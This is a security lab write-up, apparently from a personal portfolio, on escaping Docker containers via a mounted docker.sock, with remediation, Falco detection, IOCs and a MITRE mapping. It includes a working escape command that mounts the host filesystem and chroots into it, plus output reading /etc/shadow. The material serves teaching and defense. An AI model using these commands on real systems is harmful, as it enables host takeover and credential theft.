> **English** | [Italiano](README.md)

# Container runtime security - escape techniques

> - **Phase:** Cloud Security - Container Escape (Privilege Escalation)
> - **Visibility:** Medium - the execution of commands in the container and the breakout leave traces in the daemon and host logs; runtime monitoring (Falco) detects the escape patterns
> - **Prerequisites:** Access to a container (RCE on a containerized app, shell in a container); a container misconfiguration (mounted socket, privileged, excessive capabilities)
> - **Output:** Finding CLOUD-006; escape from the container toward the host; root privileges on the hosting host

- **Operating Environment:** Lab Docker host, test containers
- **Starting point:** shell in a misconfigured container
- **Main tools:** docker cli, native commands, Falco (defensive)

---

## Executive summary

A container is not a virtual machine: there is no hypervisor that completely isolates the guest from the host. A container shares the host's kernel and is isolated only by mechanisms of the kernel itself (namespaces, cgroups, capabilities). This isolation is effective when the container is configured correctly, but fragile when it is not: some common misconfigurations allow **escaping** from the container and gaining control of the hosting host - the "container escape".

Finding CLOUD-006 documents the most classic and widespread escape technique: the mounting of the **Docker socket** (`/var/run/docker.sock`) inside the container. The socket is the control interface of the host's Docker daemon; a container that has access to it can command the daemon to create a new privileged container that mounts the entire host filesystem, effectively obtaining root on the host. Other variants (`--privileged` container, `CAP_SYS_ADMIN` capability, host mount) lead to the same result by different paths.

The severity is `Critical` because the escape completely nullifies the isolation: from a compromised containerized application (perhaps reached with a simple web RCE) one arrives at control of the host and, from there, of all the other containers running on it. It is the passage from "one breached app" to "the entire host compromised".

---

## Folder structure

```
runtime-security/
+-- README.md      # this file: container escape techniques (CLOUD-006)
+-- img/           # breakout via docker.sock
```

---

## Container escape via Docker socket

**Finding ID:** `CLOUD-006` | **Severity:** `Critical` (escape from the container and root on the hosting host; completely nullifies the container's isolation)

### Operational context

The Docker socket (`/var/run/docker.sock`) is sometimes mounted inside a container to allow it to manage other containers ("Docker-in-Docker" pattern, CI runners, monitoring). But giving a container access to the socket is equivalent to giving it control of the host's Docker daemon - and therefore of the host itself, because the daemon runs as root and can create containers that mount anything.

### PoC - detection of the misconfiguration

```Bash
# Inside the container: is the Docker socket mounted? (misconfiguration)
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 /var/run/docker.sock   <-- socket mounted: escape possible (CLOUD-006)
```

### PoC - escape: from the container to root on the host

```Bash
# From the container with the socket: I create a new privileged container
# that mounts the entire host filesystem in /host and run a shell in it
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host alpine chroot /host sh
```

```
# Now I am root on the host, no longer in the container:
whoami
root
cat /host/etc/shadow | head -1                    <-- access to the host (CLOUD-006)
root:$6$...:19000:0:99999:7:::
# complete control of the hosting host and all its containers
```

### PoC - other escape paths (variants)

```Bash
# Privileged container: direct access to the host devices
# (if started with --privileged, one can mount the host disk)
cat /proc/1/cgroup | grep -q docker && echo "in container"
fdisk -l                    # if --privileged: the host disks are visible -> mount

# Excessive CAP_SYS_ADMIN capability or host mount in /
# -> different paths, same result: breakout toward the host
```

### Remediation

- **Never mount the Docker socket** in an untrusted container; if container management is needed, use secure solutions (Docker API with TLS and restricted permissions, rootless Docker, or a socket proxy that filters the calls)
- **Avoid `--privileged`:** it is almost never necessary; grant only the specific capabilities required (`--cap-add`), never all of them
- **Container least privilege:** non-root user in the container (`USER` in the Dockerfile), read-only filesystem, `no-new-privileges`, seccomp/AppArmor
- **Runtime detection:** Falco detects the escape patterns in real time (shell spawning, anomalous mounts, socket access); it is the defensive control that detects the escape while it happens

---

## Lab experience

The container escape overturned my perception of isolation. Coming from the virtual machine model, I assumed a container was a solid barrier; discovering that it shares the host's kernel and that the isolation depends on correct (and fragile) configurations was a shift of mental model. A container is not a VM: it is a process isolated by kernel mechanisms, and those mechanisms can be bypassed when the configuration weakens them.

The mounted Docker socket was the most instructive example because the misconfiguration seems harmless. Mounting `docker.sock` is a common and apparently practical pattern (the container manages other containers); but it is equivalent to handing over the keys to the host. The breakout in three lines - I create a privileged container that mounts `/` and chroot into it - made concrete the disproportion between the triviality of the misconfiguration and the totality of its impact. From a shell in a container to root on the host, without any exploit, only by abusing a granted access.

The defensive reflection was on the link with the rest of the path. A web RCE (module 03) running in a misconfigured container does not stay confined to the app: it becomes, via escape, control of the host and of all the neighboring containers. The container's isolation, when it works, contains the damage of an application compromise; when it is misconfigured, it amplifies it. Container runtime security is what decides whether a breached app stays a local incident or becomes the compromise of the infrastructure.

---

## Theoretical analysis: isolation as configuration, not as a barrier

The fundamental difference between container and VM is the nature of the isolation. A VM is isolated by a hypervisor that simulates separate hardware: the guest does not, by construction, have access to the host. A container is isolated by mechanisms of the shared kernel (namespaces for visibility, cgroups for resources, capabilities for privileges): the isolation is not a physical barrier but a set of configurable restrictions. This makes containers lightweight and efficient, but shifts security from the presence of a barrier to the correctness of a configuration.

It follows that every misconfiguration that weakens those mechanisms opens an escape path. The Docker socket bypasses the restrictions by giving access to the privileged daemon; `--privileged` disables most of the restrictions in bulk; an excessive capability removes a specific but critical one. In all cases, the container stops being isolated not because a barrier was broken, but because it was never correctly erected. The attacker does not "break" the isolation, they exploit an incomplete isolation.

This defines the principle of container security: the default must be least privilege, and every derogation (an extra capability, the socket, privileged) must be justified and evaluated as a loosening of the isolation. The correct mental model is not "the container is isolated unless proven otherwise" but "the container is isolated only as much as I configure it". The defense - non-root user, no privileged, no socket, seccomp/AppArmor, runtime detection with Falco - is the active construction of that isolation the container does not guarantee on its own.

---

## Real-World scenario: Post-Exploitation projection

> Attacker and defender perspectives in a real engagement.

### Attacker perspective (red team)

**Starting point:** root on the Docker host obtained via escape from a misconfigured container (CLOUD-006).

**Projected kill chain:**

```
[RCE on containerized web app (module 03)] -> shell in the container
        |
        v
[CLOUD-006] docker.sock mounted -> escape -> root on the host
        |
        v
Control of all the containers on the host (other services, other data)
        |
        v
Access to the credentials/secrets mounted in the containers -> pivot
        |
        v
Compromise of the host infrastructure + lateral movement
```

**Potential impact:** the escape turns the compromise of a single application into control of the host and everything running on it. In an environment where multiple services share the same Docker host, an escape from just one exposes all the others - their data, their secrets, their credentials. The link with module 03 is direct: a web RCE, contained if the container is secure, becomes the compromise of the infrastructure if the container allows the escape.

### Defender perspective (blue team)

**Detection:** Falco detects the escape patterns in real time - shell spawning in a container, Docker socket access, anomalous mounts, execution of `docker run` from inside a container. Runtime monitoring is the key control because the escape happens at runtime, not at the build.

**Indicators of Compromise (IOC):**
- Access to `/var/run/docker.sock` from inside a container
- Creation of privileged containers or with `/` mount (anomalous daemon calls)
- Spawning of shells (`sh`/`bash`) in containers that should not have any
- Processes exiting the container namespace

**Containment and hardening:**
- Removal of the socket from the containers; `--privileged` forbidden; minimal capabilities
- Non-root user in the containers, read-only filesystem, `no-new-privileges`, seccomp/AppArmor
- Falco (or equivalent) for runtime detection
- Segmentation: do not have workloads with different trust levels share the same host

**Defensive lesson:** the container's isolation is a configuration, not a guarantee. The defense requires both prevention (least-privilege configuration, no unjustified derogation) and runtime detection (Falco), because a misconfiguration missed by the first line must be caught by the second. An untrusted container must never have what allows it to escape - and if it does, the escape must be detected while it happens.

---

## Reference tools

| tool | type | role | main use case |
| :--- | :--- | :--- | :--- |
| `docker cli` | container cli | official | interaction with the daemon (including via the abused socket) |
| `Falco` | runtime security | defensive | real-time detection of the escape patterns |
| `amicontained` | container recon | analysis | verification of the container's capabilities, seccomp, namespaces |
| `deepce` | escape enumeration | offensive | automatic enumeration of the escape paths |
| `AppArmor`/`seccomp` | sandbox | defensive | restriction of the syscalls and capabilities |

> **Recommended modern tool:** offensively `deepce` (Docker Enumeration and Escape) automates the discovery of the escape paths. Defensively `Falco` is the standard for container runtime detection, with native rules for the escapes. `amicontained` to quickly verify a container's security posture.

---

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| privilege escalation | escape to host | `T1611` | escape from the container to the host via docker socket (CLOUD-006) |
| execution | deploy container | `T1610` | creation of a privileged container for the breakout (CLOUD-006) |
| discovery | container and resource discovery | `T1613` | enumeration of the containers and the misconfigurations |
| lateral movement | (host) to other containers | `T1611` | from the compromised host to control of the other containers |

| defensive countermeasure (d3fend) | d3fend id | application |
| :--- | :--- | :--- |
| process spawn analysis | `D3-PSA` | falco detects the anomalous spawning of shells/processes |
| mandatory access control | `D3-MAC` | seccomp/apparmor restrict the container's capabilities |

---

> **Note:** All documented activities were conducted on lab Docker hosts and containers owned by the author. Container escape on third-party infrastructures without authorization is a crime. Techniques are documented for educational and authorized security assessment purposes.
